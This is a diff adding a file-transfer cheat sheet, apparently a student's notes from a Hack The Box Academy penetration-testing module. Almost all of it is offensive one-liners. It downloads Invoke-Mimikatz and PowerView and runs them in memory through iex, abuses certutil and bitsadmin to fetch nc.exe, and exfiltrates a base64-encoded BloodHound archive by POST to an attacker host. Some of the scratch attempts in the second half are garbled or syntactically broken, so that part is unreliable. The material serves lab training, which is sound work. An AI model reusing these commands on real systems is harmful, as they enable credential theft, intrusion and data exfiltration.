@@ -1,0 +1,78 @@
+
+
+Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"	Invoke-WebRequest using a Chrome User Agent
+
+Download a file over HTTP.
+PS C:\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
+
+Download a file with PowerShell (aliases iwr, curl, and wget can be used instead of Invoke-WebRequest)
+Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1	
+
+PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex *IF IE Blocked*
+
+Execute a file in memory using PowerShell
+IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')	
+Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
+
+Upload a file with PowerShell
+Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64	
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
+PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
+echo <base64> | base64 -d -w 0 > bloodhound.zip
+
+Download a file using BITSadmin
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe	
+PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
+PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
+
+Download a file using Certutil
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe	
+
+Download a file using Wget
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	
+
+Download a file using cURL
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	
+
+Download a file using PHP
+php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	
+
+Upload a file using SCP
+scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	
+Download a file using SCP
+scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	
+
+wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip 
+
+Start-BitsTransfer "https://academy.hackthebox.com/storage/modules/24/upload_win.zip" -Destination "http://10.129.201.55/uploads/bloodhound.zip" -TransferType Upload
+
+certutil.exe -verifyctl -split -f https://academy.hackthebox.com/storage/modules/24/upload_win.zip
+
+Invoke-WebRequest https://academy.hackthebox.com/storage/modules/24/upload_win.zip -UseBasicParsing | iex
+
+Start-BitsTransfer "upload_win.zip" -Destination "http://10.129.201.55/uploads/bloodhound.zip" -TransferType Upload
+
+bitsadmin /transfer n https://academy.hackthebox.com/storage/modules/24/upload_win.zip C:\upload\upload_win.zip 
+
+10.129.125.4
+
+(New-Object System.Net.WebClient).DownloadFile("https://academy.hackthebox.com/storage/modules/24/upload_win.zip ", "./")
+
+(New-Object System.Net.WebClient).DownloadFile('https://academy.hackthebox.com/storage/modules/24/upload_win.zip',"./win.zip")
+
+Invoke-WebRequest https://academy.hackthebox.com/storage/modules/24/upload_win.zip -OutFile win.zip
+
+ 
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'https://academy.hackthebox.com/storage/modules/24/upload_win.zip' -Encoding Byte))
+Invoke-WebRequest -Uri http://10.129.125.4:443 -Method POST -Body $b64
+
+Invoke-WebRequest https://academy.hackthebox.com/storage/modules/24/upload_win.zip -UseBasicParsing | iex
+
+EX (New-Object Net.WebClient).DownloadString('https://academy.hackthebox.com/storage/modules/24/upload_win.zip')
+
+Invoke-WebRequest https://academy.hackthebox.com/storage/modules/24/upload_win.zip -OutFile upload_win.zip
+
+Start-BitsTransfer "https://academy.hackthebox.com/storage/modules/24/upload_win.zip" -Destination "./win.zip" -TransferType Upload
+
+certutil.exe -verifyctl -split -f https://academy.hackthebox.com/storage/modules/24/upload_win.zip
